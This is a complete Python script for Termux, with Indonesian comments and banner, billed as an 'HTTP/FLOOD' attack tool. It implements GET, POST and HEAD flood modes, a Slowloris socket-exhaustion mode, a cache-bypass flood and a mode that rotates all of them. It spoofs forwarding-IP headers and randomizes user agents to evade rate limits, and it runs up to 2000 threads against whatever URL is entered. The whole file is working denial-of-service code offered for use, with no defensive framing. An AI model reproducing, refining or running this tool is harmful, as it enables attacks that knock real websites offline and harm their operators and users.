#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import threading
import time
import os
import sys
import random
import socket
import struct
from datetime import datetime
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import deque

# ── warna ─────────────────────────────────────────────────────────────────────
class C:
    HEADER = '\033[95m'; BLUE   = '\033[94m'; GREEN  = '\033[92m'
    YELLOW = '\033[93m'; RED    = '\033[91m'; CYAN   = '\033[96m'
    PURPLE = '\033[95m'; RESET  = '\033[0m';  BOLD   = '\033[1m'

os.system('clear')

print(C.PURPLE + C.BOLD + r"""
╔══════════════════════════════════════════════════════════╗
║     █████╗ ██████╗ ██╗██████╗                           ║
║    ██╔══██╗██╔══██╗██║██╔══██╗                          ║
║    ███████║██████╔╝██║██║  ██║                          ║
║    ██╔══██║██╔══██╗██║██║  ██║                          ║
║    ██║  ██║██████╔╝██║██████╔╝                          ║
║    ╚═╝  ╚═╝╚═════╝ ╚═╝╚═════╝                           ║
║                                                          ║
║        🔥 SERANGAN HTTP/FLOOD — REINFORCED 🔥           ║
║                   OLEH: ABID                             ║
║                   VERSI: 4.0                             ║
╚══════════════════════════════════════════════════════════╝
""" + C.RESET)
print(C.CYAN + "⚡" + "="*60 + "⚡" + C.RESET)
print(C.YELLOW + "📅 " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + C.RESET)
print(C.CYAN + "⚡" + "="*60 + "⚡\n" + C.RESET)

# ── user-agent pool besar ─────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Dalvik/2.1.0 (Linux; U; Android 14; SM-G991B Build/UP1A.231005.007)",
    "curl/8.7.1",
    "python-httpx/0.27.0",
    "Go-http-client/2.0",
    "okhttp/4.12.0",
]

# ── path pool untuk randomisasi ───────────────────────────────────────────────
PATHS = [
    "/", "/index.php", "/index.html", "/home", "/api", "/api/v1",
    "/api/v2/data", "/login", "/admin", "/wp-admin", "/wp-login.php",
    "/search", "/query", "/.env", "/config", "/robots.txt",
    "/sitemap.xml", "/static/main.js", "/assets/bundle.js",
]

def rand_ip() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def rand_path() -> str:
    base = random.choice(PATHS)
    return base + f"?q={''.join(random.choices('abcdefghijklmnop', k=random.randint(8,32)))}"

def rand_headers(host: str) -> dict:
    """Header beda tiap request — bypass cache & rate-limit filter."""
    return {
        "User-Agent"      : random.choice(USER_AGENTS),
        "Accept"          : random.choice(["*/*", "text/html,application/xhtml+xml", "application/json"]),
        "Accept-Language" : random.choice(["id-ID,id;q=0.9", "en-US,en;q=0.9", "en-GB,en;q=0.8"]),
        "Accept-Encoding" : "gzip, deflate, br",
        "Connection"      : random.choice(["keep-alive", "close"]),
        "X-Forwarded-For" : rand_ip(),
        "X-Real-IP"       : rand_ip(),
        "X-Client-IP"     : rand_ip(),
        "Referer"         : f"https://{rand_ip()}/",
        "Cache-Control"   : random.choice(["no-cache", "no-store", "max-age=0"]),
        "Pragma"          : "no-cache",
    }

# ── counter thread-safe ───────────────────────────────────────────────────────
class AtomicCounter:
    def __init__(self):
        self._val  = 0
        self._lock = threading.Lock()

    def inc(self):
        with self._lock:
            self._val += 1

    @property
    def val(self):
        with self._lock:
            return self._val

packets_sent   = AtomicCounter()
packets_failed = AtomicCounter()
stop_event     = threading.Event()

# ── request pool per-session ──────────────────────────────────────────────────
def make_session() -> requests.Session:
    s = requests.Session()
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=100,
        pool_maxsize=100,
        max_retries=0,           # jangan retry — waste time
    )
    s.mount("http://",  adapter)
    s.mount("https://", adapter)
    return s

# ── worker mode: GET flood ────────────────────────────────────────────────────
def worker_get(base_url: str, host: str, thread_id: int):
    session = make_session()
    local   = 0
    while not stop_event.is_set():
        url = base_url + rand_path()
        try:
            session.get(url, headers=rand_headers(host), timeout=2, allow_redirects=False)
            packets_sent.inc()
            local += 1
        except Exception:
            packets_failed.inc()
    session.close()

# ── worker mode: POST flood ───────────────────────────────────────────────────
def worker_post(base_url: str, host: str, thread_id: int):
    session = make_session()
    while not stop_event.is_set():
        url     = base_url + rand_path()
        payload = {
            rand_ip(): ''.join(random.choices('abcdefghijklmnop0123456789', k=random.randint(64, 512)))
            for _ in range(random.randint(3, 10))
        }
        try:
            session.post(url, headers=rand_headers(host), data=payload, timeout=2, allow_redirects=False)
            packets_sent.inc()
        except Exception:
            packets_failed.inc()
    session.close()

# ── worker mode: Slowloris HTTP ───────────────────────────────────────────────
def worker_slowloris(host: str, port: int, thread_id: int):
    """
    Slowloris — keep socket terbuka selamanya.
    Exhausts server connection pool dengan bandwidth minimal.
    """
    sockets = []
    pool_sz = 150

    def _open():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            s.send(
                f"GET /?{random.randint(0,999999)} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"X-Forwarded-For: {rand_ip()}\r\n"
                "Accept-language: id-ID,id;q=0.9\r\n".encode()
            )
            return s
        except Exception:
            return None

    for _ in range(pool_sz):
        s = _open()
        if s:
            sockets.append(s)

    while not stop_event.is_set():
        for s in list(sockets):
            try:
                s.send(f"X-Heartbeat: {random.randint(1,999999)}\r\n".encode())
                packets_sent.inc()
            except Exception:
                sockets.remove(s)
                packets_failed.inc()
        while len(sockets) < pool_sz and not stop_event.is_set():
            s = _open()
            if s:
                sockets.append(s)
        time.sleep(8)

# ── worker mode: HEAD flood (ultra-ringan, rate tinggi) ───────────────────────
def worker_head(base_url: str, host: str, thread_id: int):
    session = make_session()
    while not stop_event.is_set():
        try:
            session.head(base_url + rand_path(), headers=rand_headers(host), timeout=2, allow_redirects=False)
            packets_sent.inc()
        except Exception:
            packets_failed.inc()
    session.close()

# ── worker mode: Bypass cache — no-cache + random QS ─────────────────────────
def worker_bypass(base_url: str, host: str, thread_id: int):
    """
    Cache-bypass flood — paksa server compute setiap request,
    tidak bisa serve dari cache.
    """
    session = make_session()
    while not stop_event.is_set():
        ts  = str(time.time_ns())
        rnd = ''.join(random.choices('0123456789abcdef', k=16))
        url = f"{base_url}/?_={ts}&r={rnd}&cb={random.randint(0,999999)}"
        hdrs = rand_headers(host)
        hdrs["Cache-Control"] = "no-cache, no-store, must-revalidate"
        hdrs["Pragma"]        = "no-cache"
        try:
            session.get(url, headers=hdrs, timeout=2, allow_redirects=False)
            packets_sent.inc()
        except Exception:
            packets_failed.inc()
    session.close()

# ── stats printer ─────────────────────────────────────────────────────────────
def stats_loop(start: float):
    prev = 0
    while not stop_event.is_set():
        now     = packets_sent.val
        elapsed = time.time() - start
        rate    = (now - prev)
        prev    = now
        bar_len = min(int(rate / 5), 50)
        bar     = "█" * bar_len + "░" * (50 - bar_len)
        print(
            C.CYAN + f"\r⚡ [{bar}] "
            + C.GREEN + f"{now:,} sent "
            + C.RED   + f"{packets_failed.val:,} fail "
            + C.YELLOW+ f"| {rate}/s "
            + C.BLUE  + f"| {elapsed:.0f}s"
            + C.RESET,
            end="", flush=True
        )
        time.sleep(1)

# ── helpers ───────────────────────────────────────────────────────────────────
def validate_url(url: str) -> bool:
    try:
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        return urlparse(url).netloc != ""
    except Exception:
        return False

def resolve_host(url: str) -> str:
    try:
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        host = urlparse(url).netloc.split(":")[0]
        return socket.gethostbyname(host)
    except Exception:
        return "?"

def get_host_port(url: str):
    parsed = urlparse(url)
    host   = parsed.netloc.split(":")[0]
    port   = parsed.port or (443 if parsed.scheme == "https" else 80)
    return host, port

# ── mode dispatch ─────────────────────────────────────────────────────────────
MODES = {
    "1": ("GET flood",    worker_get),
    "2": ("POST flood",   worker_post),
    "3": ("HEAD flood",   worker_head),
    "4": ("Slowloris",    None),         # handle khusus
    "5": ("Cache bypass", worker_bypass),
    "6": ("FULL AUTO",    None),         # rotasi semua mode
}

# ── main ──────────────────────────────────────────────────────────────────────
def main():
    global stop_event

    print(C.BOLD + C.CYAN + "\n⚙️  KONFIGURASI" + C.RESET)
    print(C.CYAN + "─"*50 + C.RESET)

    # URL
    while True:
        target_url = input(C.GREEN + "🌐 URL target: " + C.RESET).strip()
        if validate_url(target_url):
            break
        print(C.RED + "❌ URL tidak valid!" + C.RESET)

    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    base_url        = target_url.rstrip("/")
    host, port      = get_host_port(target_url)
    target_ip       = resolve_host(target_url)
    print(C.CYAN + f"📌 IP: {target_ip} | Host: {host}:{port}" + C.RESET)

    # Durasi
    while True:
        try:
            d = input(C.GREEN + "⏱️  Durasi (detik) [default 60]: " + C.RESET).strip()
            duration = int(d) if d else 60
            if duration > 0: break
        except ValueError:
            pass
        print(C.RED + "❌ Angka positif!" + C.RESET)

    # Thread
    while True:
        try:
            t = input(C.GREEN + "🧵 Jumlah thread [default 100]: " + C.RESET).strip()
            num_threads = int(t) if t else 100
            if 1 <= num_threads <= 2000: break
        except ValueError:
            pass
        print(C.RED + "❌ 1–2000!" + C.RESET)

    # Mode
    print(C.YELLOW + "\n📋 Mode serangan:" + C.RESET)
    for k, (name, _) in MODES.items():
        print(f"  {k}. {name}")
    mode_choice = input(C.GREEN + "👉 Pilihan [default: 1]: " + C.RESET).strip() or "1"
    if mode_choice not in MODES:
        mode_choice = "1"
    mode_name, mode_fn = MODES[mode_choice]

    # Summary
    print(C.CYAN + "\n" + "─"*50 + C.RESET)
    print(C.BOLD + C.YELLOW + "📊 Ringkasan:" + C.RESET)
    print(f"   URL     : {target_url}")
    print(f"   IP      : {target_ip}")
    print(f"   Durasi  : {duration}s")
    print(f"   Thread  : {num_threads}")
    print(f"   Mode    : {mode_name}")
    print(C.CYAN + "─"*50 + C.RESET)

    confirm = input(C.YELLOW + "⚠️  Mulai? (y/n): " + C.RESET).lower().strip()
    if confirm != "y":
        print(C.RED + "❌ Dibatalkan." + C.RESET)
        return

    print(C.RED + C.BOLD + f"\n🔥 SERANGAN DIMULAI — {target_url}" + C.RESET)

    stop_event = threading.Event()
    start_time = time.time()

    # stats
    st = threading.Thread(target=stats_loop, args=(start_time,), daemon=True)
    st.start()

    # workers
    try:
        if mode_choice == "4":
            # slowloris — tiap thread punya pool socket sendiri
            with ThreadPoolExecutor(max_workers=num_threads) as pool:
                futs = [pool.submit(worker_slowloris, host, port, i) for i in range(num_threads)]
                time.sleep(duration)
                stop_event.set()

        elif mode_choice == "6":
            # full auto — rotasi semua mode
            worker_pool = [worker_get, worker_post, worker_head, worker_bypass]
            with ThreadPoolExecutor(max_workers=num_threads) as pool:
                futs = [
                    pool.submit(random.choice(worker_pool), base_url, host, i)
                    for i in range(num_threads)
                ]
                time.sleep(duration)
                stop_event.set()

        else:
            with ThreadPoolExecutor(max_workers=num_threads) as pool:
                futs = [pool.submit(mode_fn, base_url, host, i) for i in range(num_threads)]
                time.sleep(duration)
                stop_event.set()

    except KeyboardInterrupt:
        stop_event.set()
        print(C.YELLOW + C.BOLD + "\n\n⚠️ DIHENTIKAN MANUAL" + C.RESET)

    elapsed = time.time() - start_time
    total   = packets_sent.val
    failed  = packets_failed.val

    print(C.GREEN + C.BOLD + f"\n\n✅ SELESAI!" + C.RESET)
    print(C.GREEN + f"   📊 Total terkirim : {total:,}" + C.RESET)
    print(C.RED   + f"   ❌ Gagal          : {failed:,}" + C.RESET)
    print(C.CYAN  + f"   ⏱️  Waktu aktual  : {elapsed:.2f}s" + C.RESET)
    print(C.YELLOW+ f"   📈 Rata-rata      : {total/elapsed:.1f} req/s" + C.RESET)

    print(C.PURPLE + "\n" + "⚡"*50 + C.RESET)
    print(C.CYAN   + "✨ Dibuat oleh ABID — Reinforced by AR" + C.RESET)
    print(C.PURPLE + "⚡"*50 + C.RESET)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(C.YELLOW + "\n\n👋 Sampai jumpa!" + C.RESET)
    except Exception as e:
        print(C.RED + f"\n❌ Fatal: {e}" + C.RESET)
